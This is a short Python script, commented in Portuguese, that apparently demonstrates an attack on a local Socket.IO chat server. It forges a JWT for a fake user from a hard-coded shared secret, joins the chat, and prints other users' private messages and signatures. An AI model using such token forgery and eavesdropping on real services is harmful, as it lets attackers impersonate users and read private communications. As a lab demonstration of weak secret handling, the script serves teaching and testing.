# mitm_client.py
import socketio
import jwt
import secrets
import sys

# Defina seu token MITM - para simular "usuário malicioso"
MITM_USERNAME = 'MR.Robot'
SECRET_KEY = 'sua_chave_secreta_aqui'

# Gera token JWT para se passar por um usuário válido
def generate_mitm_token():
    payload = {
        'username': MITM_USERNAME,
        'exp': secrets.token_hex(16)  # Só para mudar o token
    }
    token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')
    if isinstance(token, bytes):
        token = token.decode('utf-8')
    return token

# Conectar ao servidor
sio = socketio.Client()

@sio.event
def connect():
    print('[MITM] Conectado ao servidor.')
    token = generate_mitm_token()
    sio.emit('join', {'token': token})

@sio.event
def online_users(data):
    print(f"[MITM] Usuários online: {data['users']}")

@sio.event
def new_message(data):
    print(f"[MITM] *** Interceptada mensagem ***")
    print(f"De: {data['sender']} -> Para: {data['recipient']}")
    print(f"Mensagem: {data['message']}")
    print(f"Assinatura: {data.get('signature')}")
    print("----------------------------------------")

@sio.event
def error(data):
    print(f"[MITM] Erro: {data['message']}")

@sio.event
def disconnect():
    print('[MITM] Desconectado.')

if __name__ == '__main__':
    server_url = 'http://localhost:5000'
    print(f"[MITM] Iniciando ataque contra {server_url} ...")
    sio.connect(server_url)
    sio.wait()
